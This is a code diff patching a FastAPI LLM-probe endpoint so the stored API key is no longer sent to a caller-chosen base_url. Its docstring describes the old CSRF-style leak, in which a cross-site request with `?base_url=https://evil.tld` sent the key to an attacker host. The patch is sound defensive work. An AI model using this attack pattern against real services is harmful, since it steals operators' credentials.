@@ -3,6 +3,7 @@
 import logging
 from pathlib import Path
 from typing import Optional
+from urllib.parse import urlparse
 
 import httpx
 from fastapi import APIRouter, Depends, HTTPException
@@ -73,10 +74,43 @@ async def probe_llm(
 ) -> ProbeResponse:
     """Probe an LLM endpoint and list available models.
 
-    If base_url/api_key are not provided, uses settings.llm_base_url/llm_api_key.
+    Omit base_url and api_key to probe the configured endpoint. Supplying
+    base_url requires supplying api_key with it: the stored LLM_API_KEY is
+    never sent to a caller-chosen host.
+
+    Both parameters are scalars with defaults, so FastAPI binds them as query
+    params and a POST here needs no body. That makes it a CORS simple request
+    with no preflight, so any page the operator visits can fire it. Before the
+    api_key requirement below, `?base_url=https://evil.tld` mailed the stored
+    key to that host in an Authorization header; cors_origins only hid the
+    response, which the attacker's own server did not need.
     """
     url = (base_url or settings.llm_base_url).rstrip("/")
-    key = api_key or settings.llm_api_key
+
+    if base_url:
+        parsed = urlparse(url)
+        if parsed.scheme not in ("http", "https"):
+            raise HTTPException(
+                status_code=400,
+                detail="base_url must be http:// or https://",
+            )
+        if not parsed.hostname or parsed.username or parsed.password:
+            raise HTTPException(
+                status_code=400,
+                detail="base_url must be a plain host URL with no embedded credentials",
+            )
+        if not api_key:
+            raise HTTPException(
+                status_code=400,
+                detail=(
+                    "api_key is required when base_url is supplied — the stored "
+                    "LLM_API_KEY is never forwarded to a caller-chosen host"
+                ),
+            )
+        key = api_key
+    else:
+        key = api_key or settings.llm_api_key
+
     models_endpoint = f"{url}/models"
 
     if not key:
